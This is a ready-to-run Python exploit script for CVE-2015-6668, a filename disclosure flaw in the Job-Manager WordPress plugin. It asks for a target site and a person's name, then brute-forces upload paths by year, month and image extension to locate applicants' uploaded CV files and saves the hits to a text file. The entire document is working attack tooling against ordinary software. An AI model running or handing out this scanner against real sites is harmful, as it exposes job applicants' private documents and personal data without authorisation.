import requests
from urllib.parse import urlparse
from tqdm import tqdm
from colorama import Fore, Style, init

# Inicializa colorama
init(autoreset=True)

def banner():
    print(f"""
{Fore.CYAN}
=================================================================
| 			CVE-2015-6668				|
|								|
| Title   : CV filename disclosure on Job-Manager WP Plugin	|
| Author  : Erick Olortegui					|
| Blog    : https://notrustedx.github.io/			|
| Plugin  : https://wpjobmanager.com/				|
| Versions: <=0.7.25						|
|								|
=================================================================
{Style.RESET_ALL}
""")

def is_valid_url(url):
    parsed = urlparse(url)
    return parsed.scheme in {"http", "https"} and parsed.netloc

def main():
    banner()
    website = input("Enter a vulnerable website (e.g. https://example.com): ").strip()
    
    if not is_valid_url(website):
        print(f"{Fore.RED}[-] Invalid URL format. Include http(s)://")
        return

    filename = input("Enter the CV file name (e.g. John Doe): ").strip()
    filename2 = filename.replace(" ", "-")

    start_year = int(input("Enter start year (e.g. 2017): "))
    end_year = int(input("Enter end year (e.g. 2019): "))

    extensions = {"jpeg", "png", "jpg"}
    total_requests = (end_year - start_year + 1) * 12 * len(extensions)

    found_urls = []
    print("\n[~] Searching for potential CV URLs...\n")

    progress = tqdm(total=total_requests, desc="Scanning", ncols=80)

    for year in range(start_year, end_year + 1):
        for month in range(1, 13):
            for ext in extensions:
                url = f"{website}/wp-content/uploads/{year}/{month:02}/{filename2}.{ext}"
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        print(f"{Fore.GREEN}[+] Found CV: {url}")
                        found_urls.append(url)
                    # Opcional: muestra solo si quieres los errores
                    # else:
                    #     print(f"{Fore.RED}[-] Not found: {url}")
                except requests.RequestException as e:
                    print(f"{Fore.RED}[!] Error accessing {url} - {e}")
                progress.update(1)

    progress.close()

    if found_urls:
        with open("found_cv_urls.txt", "w") as f:
            for url in found_urls:
                f.write(url + "\n")
        print(f"\n{Fore.GREEN}[+] Results saved to found_cv_urls.txt")
    else:
        print(f"\n{Fore.YELLOW}[-] No CVs found for the given input.")

if __name__ == "__main__":
    main()
